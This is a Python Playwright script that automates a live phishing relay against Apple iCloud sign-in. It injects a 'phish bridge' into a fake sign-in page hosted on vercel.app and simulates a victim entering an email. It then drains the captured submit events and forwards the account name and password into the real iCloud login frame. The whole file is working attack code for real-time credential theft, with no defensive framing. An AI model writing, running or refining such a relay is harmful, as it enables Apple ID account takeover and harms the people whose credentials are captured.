#!/usr/bin/env python3
"""Replicate the real phish run with a scripted victim: type email, click Continue,
drain the bridge queue, forward to icloud.com, and check what landed."""
from playwright.sync_api import sync_playwright
import phish_mirror as m

HARBOR = 'https://harbor-ten-lake.vercel.app'

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)

    victim_ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    victim_ctx.add_init_script(m.PHISH_BRIDGE)
    victim_ctx.add_init_script(m.HARBOR_DRIVER)
    victim = victim_ctx.new_page()

    apple_ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    apple = apple_ctx.new_page()
    frame = m.open_icloud_sign_in(apple)
    print('initial frame:', (frame.url[:60] + '...') if frame else None)

    victim.goto(HARBOR + '/signin', wait_until='domcontentloaded', timeout=60000)
    victim.wait_for_timeout(1500)

    # Does the bridge install on the victim page?
    print('bridge installed:', victim.evaluate('() => Boolean(window.__phishBridgeInstalled)'))
    print('form id/class:', victim.evaluate(
        "() => { var f=document.getElementById('sign-in'); "
        "return f ? (f.id + ' / ' + f.className) : 'NO FORM'; }"))

    # Simulate the victim typing an email and clicking Continue
    victim.fill('#account', 'test.example.appleid.com')
    victim.click('#continue-btn')
    victim.wait_for_timeout(1500)

    events = victim.evaluate("() => window.PhishBridge ? window.PhishBridge.queue() : []")
    print('queue events:', events)

    for ev in events:
        if ev.get('type') == 'submit':
            pl = ev.get('payload') or {}
            step, account, password = pl.get('step'), pl.get('account', ''), pl.get('password', '')
            print('  forwarding step=', step, 'account=', account)
            if step == 'email':
                m.forward_email(apple, frame, account)
                frame = m.apple_auth_frame(apple) or frame
            elif step == 'password':
                m.forward_password(apple, frame, password)
                frame = m.apple_auth_frame(apple) or frame

    apple.wait_for_timeout(1500)
    frame = m.apple_auth_frame(apple) or frame
    try:
        val = frame.locator('#account_name_text_field').input_value(timeout=5000)
    except Exception as e:
        val = 'err:' + repr(e)
    print('apple email field value:', repr(val))
    print('apple state:', m.probe_apple_frame(frame))
    b.close()
